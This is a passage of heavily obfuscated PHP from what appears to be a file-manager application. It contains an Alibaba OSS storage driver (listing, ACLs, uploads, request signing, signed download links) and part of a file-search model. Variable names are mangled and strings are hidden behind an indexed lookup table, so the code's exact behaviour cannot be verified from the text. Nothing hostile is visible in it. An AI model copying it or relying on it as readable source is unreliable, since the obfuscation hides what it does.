$‡Îû‰é); try { $€¤À¿ì = $this->client->listObjects($this->bucket, $ïÌ°ğí›); } catch (OSS\Core\OssException $èÌ—®Ç¸) { break; } $‡Îû‰é = $€¤À¿ì->getNextMarker(); $ßê¸Ğºì = $€¤À¿ì->getObjectList(); $‚…ÓÒû = $€¤À¿ì->getPrefixList(); if ($¿±§Ì‹ó) { if (count($ßê¸Ğºì) > 1 || count($ßê¸Ğºì) == 1 && $ßê¸Ğºì[0]->getKey() != $á¾¶óİ´) { $•ê÷½¼‰ += count($ßê¸Ğºì) - 1; } if (!empty($‚…ÓÒû)) { $ûïöÚ += count($‚…ÓÒû); } if ($‡Îû‰é === $°¼¢Æ¹¸[12]) { break; } continue; } if ($¥¢Ò¢²˜) { if (!empty($ßê¸Ğºì)) { if (count($ßê¸Ğºì) > 1 || $ßê¸Ğºì[0]->getKey() != $á¾¶óİ´) { return !0; } } } else { if (!empty($‚…ÓÒû)) { return !0; } } if ($‡Îû‰é === $°¼¢Æ¹¸[12]) { break; } } if ($¿±§Ì‹ó) { return array($°¼¢Æ¹¸[225] => $•ê÷½¼‰, $°¼¢Æ¹¸[226] => $ûïöÚ); } return !1; } public function listAll($‹Óàöƒ½) { $—Ü°šñç =& $_SERVER[èùÙ¹Ïö]; $ÁèÜıìÕ = $this->fileList($‹Óàöƒ½, $—Ü°šñç[12], !0); $ÒÊôÜøı = array_to_keyvalue($ÁèÜıìÕ[$—Ü°šñç[85]], $—Ü°šñç[32]); foreach ($ÁèÜıìÕ[$—Ü°šñç[84]] as $ÖÅ˜ñúµ) { if (is_string($ÖÅ˜ñúµ)) { $ÒÊôÜøı[$ÖÅ˜ñúµ] = array($—Ü°šñç[78] => 0); } } return $this->listAllFiles($‹Óàöƒ½, $ÒÊôÜøı); } public function canRead($õ®Ä ßË) { $ÑŸÖ£¿¢ =& $_SERVER[èùÙ¹Ïö]; $‚øĞ–¹Ï = $this->pathAcl($õ®Ä ßË); return $‚øĞ–¹Ï == $ÑŸÖ£¿¢[1444] || $‚øĞ–¹Ï == $ÑŸÖ£¿¢[590] ? !0 : !1; } public function canWrite($¢ÒÒÛÆÃ) { $”ÂÇÛ × = $this->pathAcl($¢ÒÒÛÆÃ); return $”ÂÇÛ × == $_SERVER[èùÙ¹Ïö][590] ? !0 : !1; } public function pathAcl($ùğœ¯¯¡) { $²Û—øÙ =& $_SERVER[èùÙ¹Ïö]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $¨õöğ ™ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($ùğœ¯¯¡)); } catch (OSS\Core\OssException $û¨…àÌİ) { return !1; } $±è•¸­ƒ = $¨õöğ ™ == $²Û—øÙ[37] ? $this->bucketAcl : $¨õöğ ™; if ($±è•¸­ƒ == $²Û—øÙ[1445]) { return $²Û—øÙ[1444]; } if ($±è•¸­ƒ == $²Û—øÙ[1446]) { return $²Û—øÙ[590]; } return $±è•¸­ƒ; } private function chmodPath($Áîû§ö, $Ùƒ‚ùÀË = '') { $ŞüÇ˜ =& $_SERVER[èùÙ¹Ïö]; $¼´‰Û = empty($Ùƒ‚ùÀË) ? $ŞüÇ˜[1446] : $Ùƒ‚ùÀË; $æ÷Í¤õ¥ = array($ŞüÇ˜[37], $ŞüÇ˜[215], $ŞüÇ˜[1445], $ŞüÇ˜[1446]); if (!in_array($¼´‰Û, $æ÷Í¤õ¥)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($Áîû§ö), $¼´‰Û); } catch (OSS\Core\OssException $­ö­Òš) { return !1; } return !0; } public function getContent($â«€ØİÀ) { return $this->fileSubstr($â«€ØİÀ, -1); } public function setContent($Ç×ßÖĞİ, $€äŞ¢ı = '') { $”œ¡äˆç =& $_SERVER[èùÙ¹Ïö]; try { $ùÊ…¼ªœ = $this->trafficLimit($”œ¡äˆç[1447]); $¿ÙÊÍ¡ì = $this->client->putObject($this->bucket, $this->pathEncode($Ç×ßÖĞİ), $€äŞ¢ı, $ùÊ…¼ªœ); } catch (OSS\Core\OssException $¯»ªó•) { return !1; } $×‹’´Ø‘ = array($”œ¡äˆç[1437] => trim($¿ÙÊÍ¡ì[$”œ¡äˆç[1434]], $”œ¡äˆç[120]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Ç×ßÖĞİ))); $this->updateObjMeta($Ç×ßÖĞİ, $×‹’´Ø‘); return isset($¿ÙÊÍ¡ì[$”œ¡äˆç[1448]][$”œ¡äˆç[277]]) ? !0 : !1; } private function updateObjMeta($ì‰¿×Šı, $»´Ãùøõ) { $ì‰¿×Šı = $this->pathEncode($ì‰¿×Šı); try { $—ƒĞÔ¿Ñ = array(OSS\OssClient::OSS_HEADERS => $»´Ãùøõ); $this->client->copyObject($this->bucket, $ì‰¿×Šı, $this->bucket, $ì‰¿×Šı, $—ƒĞÔ¿Ñ); } catch (OSS\Core\OssException $¬ËÂºÖÓ) { return !1; } return !0; } public function upload($İû®ÅÄ¶, $Â³Îığò, $ì‰¨ª•» = false, $€ÎµŞşè = REPEAT_REPLACE) { $Œù‡´Ì¿ =& $_SERVER[èùÙ¹Ïö]; $˜àİİ»‘ = trim($İû®ÅÄ¶, $Œù‡´Ì¿[8]); $¿º ñŠµ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($Œù‡´Ì¿[1437] => @md5_file($Â³Îığò)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($İû®ÅÄ¶))); $¿º ñŠµ = $this->trafficLimit($Œù‡´Ì¿[1447], $¿º ñŠµ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($˜àİİ»‘), $Â³Îığò, $¿º ñŠµ); } catch (OSS\Core\OssException $–¼±ï€Ü) { return !1; } return $this->getPathOuter($İû®ÅÄ¶); } public function getHost() { $Ó–Şß¶Ç =& $_SERVER[èùÙ¹Ïö]; $ÄË½ŸŞ÷ = explode($Ó–Şß¶Ç[200], parent::getHost()); return $ÄË½ŸŞ÷[0] . $Ó–Şß¶Ç[200] . $this->bucket . $Ó–Şß¶Ç[10] . $ÄË½ŸŞ÷[1]; } public function uploadFormData($ßé³ğ­, $ïšå„©Ø = 3600) { $ß–Ù‘áó =& $_SERVER[èùÙ¹Ïö]; if (!($×µÊŠ³” = $this->getHost())) { return !1; } $ÂóÏ‘°¨ = $ïšå„©Ø; $½Ï±•µ = date($ß–Ù‘áó[1449], time() + $ÂóÏ‘°¨); $Ÿ™Æ© = new DateTime($½Ï±•µ); $õÎÏ¬½ = $Ÿ™Æ©->format(DateTime::ISO8601); $È¹¢­˜« = strpos($õÎÏ¬½, $ß–Ù‘áó[342]); $õÎÏ¬½ = substr($õÎÏ¬½, 0, $È¹¢­˜«) . $ß–Ù‘áó[1450]; $äÆ×ş£ = 1048576000 * 5; $Şà™‘öª = $this->pathFather($ßé³ğ­); $Ó«øÍâ‡ = array($ß–Ù‘áó[260] => $õÎÏ¬½, $ß–Ù‘áó[263] => array(array($ß–Ù‘áó[1451], 0, $äÆ×ş£), array($ß–Ù‘áó[266], $ß–Ù‘áó[267], $Şà™‘öª))); $‰ÍÓâÔ‘ = base64_encode(json_encode($Ó«øÍâ‡)); $¯¯§ş = base64_encode(hash_hmac($ß–Ù‘áó[249], $‰ÍÓâÔ‘, $this->secret, !0)); $Ô’½È–Ú = array($ß–Ù‘áó[278] => $‰ÍÓâÔ‘, $ß–Ù‘áó[1452] => $this->accessKey, $ß–Ù‘áó[270] => $ß–Ù‘áó[259], $ß–Ù‘áó[1453] => $¯¯§ş, $ß–Ù‘áó[198] => $×µÊŠ³”); $Ô’½È–Ú = $this->trafficLimit($ß–Ù‘áó[1447], $Ô’½È–Ú); return $Ô’½È–Ú; } public function multiUploadFormData($Å¡¹ı–¾, $˜¥©ÍÇ = 3600) { $³ğê•²î =& $_SERVER[èùÙ¹Ïö]; if (!($õûĞÊË = $this->getHost())) { return !1; } $ö·ÓñˆÓ = $this->trafficLimit($³ğê•²î[1447]); $Ğ½Üæ‰  = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Å¡¹ı–¾), $ö·ÓñˆÓ); return array($³ğê•²î[240] => $Ğ½Üæ‰ , $³ğê•²î[198] => $õûĞÊË . $³ğê•²î[8] . $this->pathEncode($Å¡¹ı–¾), $³ğê•²î[241] => gmdate($³ğê•²î[1454]), $³ğê•²î[96] => $Å¡¹ı–¾); } public function multiUploadAuthData($™ˆ½÷ª, $¢¾ÂŒå¯ = array()) { $‡°ø–…ö =& $_SERVER[èùÙ¹Ïö]; $Šï€ø = isset($¢¾ÂŒå¯[$‡°ø–…ö[241]]) ? $¢¾ÂŒå¯[$‡°ø–…ö[241]] : gmdate($‡°ø–…ö[1454]); $¼¡ªÓ…ë = isset($¢¾ÂŒå¯[$‡°ø–…ö[177]]) ? $¢¾ÂŒå¯[$‡°ø–…ö[177]] : $‡°ø–…ö[12]; $Î×ïíÅş = $™ˆ½÷ª; if (isset($¢¾ÂŒå¯[$‡°ø–…ö[96]])) { $Î×ïíÅş = $¢¾ÂŒå¯[$‡°ø–…ö[96]]; unset($¢¾ÂŒå¯[$‡°ø–…ö[96]]); } if (isset($¢¾ÂŒå¯[$‡°ø–…ö[242]])) { $¢¾ÂŒå¯[$‡°ø–…ö[241]] = $Šï€ø; return $this->listUploadParts($Î×ïíÅş, $¢¾ÂŒå¯); } $¹ÆÏàï´ = array($‡°ø–…ö[243], $‡°ø–…ö[12], $‡°ø–…ö[122], $Šï€ø, "\x78\x2d\157\163\x73\55\x64\141\x74\x65\x3a{$Šï€ø}", $‡°ø–…ö[8] . $this->bucket . $‡°ø–…ö[8] . $Î×ïíÅş . $¼¡ªÓ…ë); if (strpos($¼¡ªÓ…ë, $‡°ø–…ö[244]) === 0) { $¹ÆÏàï´[0] = $‡°ø–…ö[245]; if ($Ğô¹ºÌÚ = $this->trafficLimit($‡°ø–…ö[1447])) { $Î×ïíÅş = $‡°ø–…ö[1455]; array_splice($¹ÆÏàï´, 5, 0, $Î×ïíÅş . $‡°ø–…ö[4] . $Ğô¹ºÌÚ[$Î×ïíÅş]); } } if (isset($¢¾ÂŒå¯[$‡°ø–…ö[246]]) && $¢¾ÂŒå¯[$‡°ø–…ö[246]] == $‡°ø–…ö[247]) { $¹ÆÏàï´[0] = $‡°ø–…ö[247]; } if (!empty($¢¾ÂŒå¯[$‡°ø–…ö[1456]])) { $ßõ‹Î—è = array_merge(array($¹ÆÏàï´[4]), $¢¾ÂŒå¯[$‡°ø–…ö[1456]]); sort($ßõ‹Î—è); $¹ÆÏàï´[4] = implode($‡°ø–…ö[248], $ßõ‹Î—è); } $½õâùÛß = implode($‡°ø–…ö[248], $¹ÆÏàï´); $±Ô Ò¥à = base64_encode(hash_hmac($‡°ø–…ö[249], $½õâùÛß, $this->secret, !0)); $‹°¶ÊÔ = $‡°ø–…ö[1420] . $this->accessKey . $‡°ø–…ö[4] . $±Ô Ò¥à; if (strpos($¼¡ªÓ…ë, $‡°ø–…ö[244]) === 0) { $‹°¶ÊÔ = array($‡°ø–…ö[251] => $‹°¶ÊÔ, $‡°ø–…ö[241] => $Šï€ø); if ($Ğô¹ºÌÚ) { $‹°¶ÊÔ = array_merge($‹°¶ÊÔ, $Ğô¹ºÌÚ); } } return $‹°¶ÊÔ; } public function listUploadParts($ã—ìÁà³, $µÈë›ø´) { $ÁÍÂá¿€ =& $_SERVER[èùÙ¹Ïö]; $İø×ê¿á = parse_url_query($µÈë›ø´[$ÁÍÂá¿€[177]]); $”¸ƒé€À = $this->client->listParts($this->bucket, $this->pathEncode($ã—ìÁà³), $İø×ê¿á[$ÁÍÂá¿€[240]]); $™‰Ø”Š = $”¸ƒé€À->getListPart(); $Ü˜åæÓ = array(); foreach ($™‰Ø”Š as $½©’¯é±) { $Ü˜åæÓ[] = array($ÁÍÂá¿€[1441] => $½©’¯é±->getPartNumber(), $ÁÍÂá¿€[1442] => trim($½©’¯é±->getETag(), $ÁÍÂá¿€[120])); } unset($µÈë›ø´[$ÁÍÂá¿€[242]], $µÈë›ø´[$ÁÍÂá¿€[246]]); $é¸ñûîõ = $this->multiUploadAuthData($ã—ìÁà³, $µÈë›ø´); if (empty($é¸ñûîõ)) { return !1; } return array($ÁÍÂá¿€[251] => $é¸ñûîõ, $ÁÍÂá¿€[241] => $µÈë›ø´[$ÁÍÂá¿€[241]], $ÁÍÂá¿€[253] => $Ü˜åæÓ); } public function download($³»ñÅãì, $ßÜ£Ïµò) { if ($this->isFolder($³»ñÅãì)) { return !1; } try { $‹•ºÌá = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $ßÜ£Ïµò); $‹•ºÌá = $this->trafficLimit($_SERVER[èùÙ¹Ïö][111], $‹•ºÌá); $this->client->getObject($this->bucket, $this->pathEncode($³»ñÅãì), $‹•ºÌá); } catch (OSS\Core\OssException $€§ÔáŒŒ) { return !1; } return $ßÜ£Ïµò; } public function fileSubstr($ïœ¶ï•, $£”£×¡É = 0, $ˆééŸ‹Ú = false) { if ($£”£×¡É === -1) { $â€Š½Ó = array(); } else { if ($ˆééŸ‹Ú === !1) { $îñƒï‹‡ = $this->size($ïœ¶ï•); } else { $îñƒï‹‡ = $£”£×¡É + $ˆééŸ‹Ú - 1; } $â€Š½Ó = array(OSS\OssClient::OSS_RANGE => "{$£”£×¡É}\x2d{$îñƒï‹‡}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($ïœ¶ï•), $â€Š½Ó); } catch (OSS\Core\OssException $¥ıÍºÔó) { think_exception($¥ıÍºÔó->getMessage()); return !1; } } private function trafficLimit($ø›ˆ¢ıà, $Â€‡Ô¡† = array()) { $“ø‰©¼Ò =& $_SERVER[èùÙ¹Ïö]; if ($ø›ˆ¢ıà == $“ø‰©¼Ò[1447] && $this->isUploadServer() || $ø›ˆ¢ıà == $“ø‰©¼Ò[111] && $this->isFileOutServer()) { return $Â€‡Ô¡†; } $–¨êºŸ£ = floatval($GLOBALS[$“ø‰©¼Ò[6]][$“ø‰©¼Ò[91]][$“ø‰©¼Ò[109]][$ø›ˆ¢ıà]) * 1024 * 1024 * 8; if (!$–¨êºŸ£) { return $Â€‡Ô¡†; } $–¨êºŸ£ = $–¨êºŸ£ < 819200 ? 819200 : ($–¨êºŸ£ > 838860800 ? 838860800 : $–¨êºŸ£); $Â€‡Ô¡†[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($–¨êºŸ£); return $Â€‡Ô¡†; } public function link($Ã‰åª÷ú, $ã‚ÇË = array()) { $ßÍäØ’ =& $_SERVER[èùÙ¹Ïö]; if (!$this->exist($Ã‰åª÷ú) || $this->isFolder($Ã‰åª÷ú)) { return !1; } try { $ã‚ÇË = $this->trafficLimit($ßÍäØ’[111], $ã‚ÇË); $Ş²¥Ë„‘ = $this->client->signUrl($this->bucket, $this->pathEncode($Ã‰åª÷ú), 3600 * 12, $ßÍäØ’[247], $ã‚ÇË); return $this->getCdnLink($Ş²¥Ë„‘); } catch (OSS\Core\OssException $ö¿àÂŒ) { return !1; } } public function fileOut($Ñ…Å”Àñ, $À…ŸÄ‹… = false, $Ôš‹¬š¢ = false, $€ìïıÊÁ = '') { $ßû¾Ú =& $_SERVER[èùÙ¹Ïö]; if ($this->isFileOutServer()) { return $this->fileOutServer($Ñ…Å”Àñ, $À…ŸÄ‹…, $Ôš‹¬š¢, $€ìïıÊÁ); } if (!$Ôš‹¬š¢) { $Ôš‹¬š¢ = $this->pathThis($Ñ…Å”Àñ); } $Ôš‹¬š¢ = rawurlencode($Ôš‹¬š¢); $ÇÖÍ ‘ = get_file_mime(get_path_ext($Ôš‹¬š¢)); if ($ÇÖÍ ‘ == $ßû¾Ú[234]) { return parent::fileOut($Ñ…Å”Àñ, $À…ŸÄ‹…, $Ôš‹¬š¢, $€ìïıÊÁ); } $À…ŸÄ‹… = $À…ŸÄ‹… ? $ßû¾Ú[1457] : $ßû¾Ú[1458]; $€Òû®éƒ = array(OSS\OssClient::OSS_SUB_RESOURCE => $ßû¾Ú[1459] . rawurlencode("{$À…ŸÄ‹…}\73\146\151\154\x65\x6e\x61\x6d\x65\x3d{$Ôš‹¬š¢}")); $€Òû®éƒ[OSS\OssClient::OSS_SUB_RESOURCE] .= $ßû¾Ú[1460] . rawurlencode($ÇÖÍ ‘); $‘¡Œş = $this->link($Ñ…Å”Àñ, $€Òû®éƒ); $this->fileOutLink($‘¡Œş); } public function fileOutServer($ë•À®¿­, $¶±ÒŞÛÅ = false, $Úêªİï = false, $ç®†™šÙ = '') { parent::fileOut($ë•À®¿­, $¶±ÒŞÛÅ, $Úêªİï, $ç®†™šÙ); } public function fileOutImage($ïÆÖÏîÙ, $›àíâÁ¬ = 250) { if ($this->size($ïÆÖÏîÙ) > 1024 * 1024 * 20) { return $this->fileOutImageServer($ïÆÖÏîÙ, $›àíâÁ¬); } $Ë›Ïíı = array(OSS\OssClient::OSS_PROCESS => $_SERVER[èùÙ¹Ïö][1417] . $›àíâÁ¬); $¡Åİ˜Ü† = $this->link($ïÆÖÏîÙ, $Ë›Ïíı); $this->fileOutLink($¡Åİ˜Ü†); } public function fileOutImageServer($ƒÊı€ÅÇ, $Âßƒ„˜Â = 250) { parent::fileOutImage($ƒÊı€ÅÇ, $Âßƒ„˜Â); } public function fileOutLink($©ğ²ÛÒ) { $£©Æ†öÚ =& $_SERVER[èùÙ¹Ïö]; if (!$this->isCdnHost() && substr($©ğ²ÛÒ, 0, 7) == $£©Æ†öÚ[1379]) { $©ğ²ÛÒ = $£©Æ†öÚ[1380] . substr($©ğ²ÛÒ, 7); } header($£©Æ†öÚ[164] . $©ğ²ÛÒ); die; } public function hashMd5($©­ºÉ€, $µ“âƒ§Á = '') { $óƒÎµ˜ó =& $_SERVER[èùÙ¹Ïö]; $´§èƒâ‘ = $this->_objectMeta($©­ºÉ€); if (!$´§èƒâ‘) { return $óƒÎµ˜ó[12]; } if (!isset($´§èƒâ‘[$óƒÎµ˜ó[1437]]) && !empty($µ“âƒ§Á)) { $ª‰å¦µ = $this->updateObjMeta($©­ºÉ€, array($óƒÎµ˜ó[1437] => $µ“âƒ§Á)); $´§èƒâ‘[$óƒÎµ˜ó[1437]] = $ª‰å¦µ ? $µ“âƒ§Á : $óƒÎµ˜ó[12]; } return isset($´§èƒâ‘[$óƒÎµ˜ó[1437]]) ? strtolower($´§èƒâ‘[$óƒÎµ˜ó[1437]]) : $óƒÎµ˜ó[12]; } public function size($Ìî¸©Ï¢) { $ûŸ›–œ© = $this->objectMeta($Ìî¸©Ï¢); return $ûŸ›–œ© ? $ûŸ›–œ©[$_SERVER[èùÙ¹Ïö][78]] : 0; } public function info($”Àæ“ÆÖ) { if ($this->isFolder($”Àæ“ÆÖ)) { return $this->folderInfo($”Àæ“ÆÖ); } else { if ($this->isFile($”Àæ“ÆÖ)) { return $this->fileInfo($”Àæ“ÆÖ); } } return !1; } public function exist($Íä°€€) { return $this->isFile($Íä°€€) || $this->isFolder($Íä°€€); } public function isFile($ë±»¨˜®) { return !$this->isFolder($ë±»¨˜®) && $this->objectMeta($ë±»¨˜®); } public function isFolder($‰Ôß³‘ª) { return $this->cacheMethod($_SERVER[èùÙ¹Ïö][168], $‰Ôß³‘ª); } protected function objectMeta($¤ë¯ú®î) { return $this->cacheMethod($_SERVER[èùÙ¹Ïö][170], $¤ë¯ú®î); } protected function _objectMeta($×Î»üó) { $¼üÁŞõ» =& $_SERVER[èùÙ¹Ïö]; try { $à’•ËÏ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($×Î»üó)); } catch (OSS\Core\OssException $´Å’Úİû) { $à’•ËÏ = !1; } if ($à’•ËÏ) { $à’•ËÏ[$¼üÁŞõ»[78]] = intval($à’•ËÏ[$¼üÁŞõ»[1435]]); } return $à’•ËÏ; } protected function _isFolder($ˆÑãöˆ¡) { $¼Æ·˜ˆÌ =& $_SERVER[èùÙ¹Ïö]; if ($ˆÑãöˆ¡ == $¼Æ·˜ˆÌ[12] || $ˆÑãöˆ¡ == $¼Æ·˜ˆÌ[8]) { return !0; } $¶ Òàáü = array($¼Æ·˜ˆÌ[1430] => $¼Æ·˜ˆÌ[8], $¼Æ·˜ˆÌ[1431] => rtrim($ˆÑãöˆ¡, $¼Æ·˜ˆÌ[8]) . $¼Æ·˜ˆÌ[8], $¼Æ·˜ˆÌ[1432] => 1, $¼Æ·˜ˆÌ[1433] => $¼Æ·˜ˆÌ[12]); $ŠÚ«¬ê = $this->client->listObjects($this->bucket, $¶ Òàáü); if ($ŠÚ«¬ê->getObjectList() || $ŠÚ«¬ê->getPrefixList()) { return !0; } return !1; } } goto fª¡Ù£ÒßÎ; d‹Åæã­§: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($¿·÷æÏ) { $ÅÄĞƒÖ” =& $_SERVER[èùÙ¹Ïö]; $¸ä¢æ÷‰ = KodIO::fileTypeList(); $æº²À¹ = $¸ä¢æ÷‰[$¿·÷æÏ]; if (!$æº²À¹) { return array(); } $ò´Â•¯ = $æº²À¹[$ÅÄĞƒÖ”[177]]; $›ÒëØ¥ = $ÅÄĞƒÖ”[7]; if (!$æº²À¹[$ÅÄĞƒÖ”[177]]) { $äÕÌïæ = array_to_keyvalue($¸ä¢æ÷‰, $ÅÄĞƒÖ”[12], $ÅÄĞƒÖ”[177]); $ò´Â•¯ = implode($ÅÄĞƒÖ”[50], $äÕÌïæ); $›ÒëØ¥ = $ÅÄĞƒÖ”[2151]; } $Ë¥÷®À± = explode($ÅÄĞƒÖ”[50], trim($ò´Â•¯, $ÅÄĞƒÖ”[50])); return array($›ÒëØ¥, $Ë¥÷®À±); } public function listPathType($Ìğ²Ò·­) { $ì€¾ñşù =& $_SERVER[èùÙ¹Ïö]; $Œ©àŸ•È = $this->fileTypeWhere($Ìğ²Ò·­); if (!$Œ©àŸ•È) { return array(); } $¤ï™Äàµ = USER_ID; $Ÿ·šÆ = Model($ì€¾ñşù[570])->getInfo($¤ï™Äàµ); $Ğ¹ÛÚŸ£ = array($ì€¾ñşù[619] => SourceModel::TYPE_USER, $ì€¾ñşù[556] => array($ì€¾ñşù[583], $ì€¾ñşù[566] . $Ÿ·šÆ[$ì€¾ñşù[89]][$ì€¾ñşù[183]] . $ì€¾ñşù[584]), $ì€¾ñşù[620] => $¤ï™Äàµ, $ì€¾ñşù[617] => 0, $ì€¾ñşù[618] => $Œ©àŸ•È); return $this->listSource($Ğ¹ÛÚŸ£); } public function listSearch($Ğ¬òÃ×ø, $ÙìÇ¦×© = 300) { $¦†“ˆ´« =& $_SERVER[èùÙ¹Ïö]; if (isset($Ğ¬òÃ×ø[$¦†“ˆ´«[1988]]) && $Ğ¬òÃ×ø[$¦†“ˆ´«[1988]]) { $Ğ¬òÃ×ø[$¦†“ˆ´«[1988]] = str_replace($¦†“ˆ´«[430], $¦†“ˆ´«[2152], trim($Ğ¬òÃ×ø[$¦†“ˆ´«[1988]])); } $Ñ¡±Û¸¿ = $this->_parseSearchWhere($Ğ¬òÃ×ø); if (!isset($Ñ¡±Û¸¿[$¦†“ˆ´«[475]])) { $Ñ¡±Û¸¿[$¦†“ˆ´«[475]] = 0; } $²İÀÊÛ’ = $¦†“ˆ´«[2153]; $ç§Ä·µÒ = $Ñ¡±Û¸¿; $’‹£Ş†È = $²İÀÊÛ’; $this->_listSearchBindPinyin($Ğ¬òÃ×ø, $Ñ¡±Û¸¿, $²İÀÊÛ’); $this->alias($¦†“ˆ´«[489])->_makeOrder(); $Ñ¡±Û¸¿ = $this->parseWhereLike($Ñ¡±Û¸¿); $ÀÛËàŞ = $this->distinct(!0)->field($²İÀÊÛ’)->where($Ñ¡±Û¸¿)->selectPage($ÙìÇ¦×©); if ($GLOBALS[$¦†“ˆ´«[6]][$¦†“ˆ´«[427]][$¦†“ˆ´«[428]] && Input::check($Ğ¬òÃ×ø[$¦†“ˆ´«[1988]], $¦†“ˆ´«[626]) && $ÀÛËàŞ[$¦†“ˆ´«[412]][$¦†“ˆ´«[399]] == 1 && $ÀÛËàŞ[$¦†“ˆ´«[412]][$¦†“ˆ´«[413]] == 0) { $ÀÛËàŞ = $this->distinct(!0)->field($²İÀÊÛ’)->where($ç§Ä·µÒ)->limit(1000)->select(); $ÀÛËàŞ = array_page_split($ÀÛËàŞ, !1, $ÙìÇ¦×©); } $this->_listSearchFileContent($ÀÛËàŞ, $Ğ¬òÃ×ø, $’‹£Ş†È, $ç§Ä·µÒ); $this->_listSearchDesc($ÀÛËàŞ, $Ğ¬òÃ×ø, $’‹£Ş†È); $this->_listSearchTag($ÀÛËàŞ, $Ğ¬òÃ×ø, $’‹£Ş†È); $this->_listSearchGroupTag($ÀÛËàŞ, $Ğ¬òÃ×ø, $’‹£Ş†È); $this->_listDataApply($ÀÛËàŞ[$¦†“ˆ´«[415]]); $this->_listMake($ÀÛËàŞ); return $ÀÛËàŞ; } private function _listSearchFileContent(&$ª—·º¾Š, $«ßÆò ´, $È¶õ”—, $‹¢Æí¼) { $À»Ôè =& $_SERVER[èùÙ¹Ïö]; if (!$«ßÆò ´[$À»Ôè[1988]] || $ª—·º¾Š[$À»Ôè[412]][$À»Ôè[399]] > 1) { return; } if (!isset($‹¢Æí¼[$À»Ôè[32]]) || !is_array($«ßÆò ´[$À»Ôè[511]])) { return; } $‹¢Æí¼[$À»Ôè[511]] = array($À»Ôè[7], $«ßÆò ´[$À»Ôè[511]]); unset($‹¢Æí¼[$À»Ôè[32]]); unset($«ßÆò ´[$À»Ôè[511]]); $–ä¯«’ = $this->field($È¶õ”—)->where($‹¢Æí¼)->limit($À»Ôè[2154])->select(); if (!$–ä¯«’ || count($–ä¯«’) == 0) { return; } $ª—·º¾Š[$À»Ôè[415]] = array_merge($–ä¯«’, $ª—·º¾Š[$À»Ôè[415]]); $ª—·º¾Š[$À»Ôè[412]][$À»Ôè[413]] += count($–ä¯«’); } private function _listSearchTag(&$üÈ¯ğ¸, $¦èœîÄà, $µµ½Üß) { $¢·¹ë± =& $_SERVER[èùÙ¹Ïö]; if (!$¦èœîÄà[$¢·¹ë±[1988]] || $üÈ¯ğ¸[$¢·¹ë±[412]][$¢·¹ë±[399]] > 1) { return; } $å¡™Ùœœ = Model($¢·¹ë±[2155])->listData(); $Æ—¿œ¤˜ = array(); $Ê’æ÷»Ë = $¦èœîÄà[$¢·¹ë±[1988]]; foreach ($å¡™Ùœœ as $Ù¾•Åøï) { $´Ó…„ƒİ = $Ù¾•Åøï[$¢·¹ë±[32]]; $çÎ·Â›— = str_replace($¢·¹ë±[53], $¢·¹ë±[12], Pinyin::get($´Ó…„ƒİ)); if (stripos($´Ó…„ƒİ, $Ê’æ÷»Ë) !== !1 || stripos($çÎ·Â›—, $Ê’æ÷»Ë) !== !1) { $Æ—¿œ¤˜[] = $Ù¾•Åøï[$¢·¹ë±[445]]; } } if (!$Æ—¿œ¤˜) { return; } $Ôñ…¡‚ = array($¢·¹ë±[470] => array($¢·¹ë±[7], $Æ—¿œ¤˜), $¢·¹ë±[1696] => USER_ID); $ ¦œÆµ– = Model($¢·¹ë±[472])->field($¢·¹ë±[86])->where($Ôñ…¡‚)->select(); $ ¦œÆµ– = array_to_keyvalue($ ¦œÆµ–, $¢·¹ë±[12], $¢·¹ë±[86]); $Óñ‚†‰ = array_unique($ ¦œÆµ–); $this->_listSearchMerge($üÈ¯ğ¸, $¦èœîÄà, $µµ½Üß, $Óñ‚†‰); } private function _listSearchDesc(&$´ß×ıÇÑ, $úŒ¶­ÕÚ, $êÏ¸ó¼±) { $Ãš±•¸¶ =& $_SERVER[èùÙ¹Ïö]; if (!$úŒ¶­ÕÚ[$Ãš±•¸¶[1988]] || $´ß×ıÇÑ[$Ãš±•¸¶[412]][$Ãš±•¸¶[399]] > 1) { return; } $À¡àòêÚ = array($Ãš±•¸¶[96] => $Ãš±•¸¶[496], $Ãš±•¸¶[420] => array($Ãš±•¸¶[429], $Ãš±•¸¶[1990] . $úŒ¶­ÕÚ[$Ãš±•¸¶[1988]] . $Ãš±•¸¶[1990])); $ßÅíêì« = !1; if ($ßÅíêì«) { $†²‰ê·å = $this->listSearchChildren($úŒ¶­ÕÚ[$Ãš±•¸¶[182]]); $†²‰ê·å = array_unique($†²‰ê·å); if (!$†²‰ê·å) { return; } $À¡àòêÚ[$Ãš±•¸¶[183]] = array($Ãš±•¸¶[7], $†²‰ê·å); } $÷™¢’¬ = Model($Ãš±•¸¶[603])->field($Ãš±•¸¶[183])->where($À¡àòêÚ)->limit(5000)->select(); $§¿ŠÃ›¸ = array_to_keyvalue($÷™¢’¬, $Ãš±•¸¶[12], $Ãš±•¸¶[183]); $this->_listSearchMerge($´ß×ıÇÑ, $úŒ¶­ÕÚ, $êÏ¸ó¼±, $§¿ŠÃ›¸); } private function _listSearchGroupTag(&$ù×†É¡, $­š–¯Ğ±, $£ìÆè±) { $‘Ñ¬øÂÅ =& $_SERVER[èùÙ¹Ïö]; if (!$­š–¯Ğ±[$‘Ñ¬øÂÅ[1988]] || $ù×†É¡[$‘Ñ¬øÂÅ[412]][$‘Ñ¬øÂÅ[399]] > 1 || !$­š–¯Ğ±[$‘Ñ¬øÂÅ[182]]) { return; } $ŸÛéÈ¹ = $this->sourceInfo($­š–¯Ğ±[$‘Ñ¬øÂÅ[182]]); if (!$ŸÛéÈ¹ || $ŸÛéÈ¹[$‘Ñ¬øÂÅ[180]] != SourceModel::TYPE_GROUP) { return; } $×‡»ôı” = $ŸÛéÈ¹[$‘Ñ¬øÂÅ[541]]; $µà–”š = Model($‘Ñ¬øÂÅ[2156])->get($×‡»ôı”); $¸™¦ß÷™ 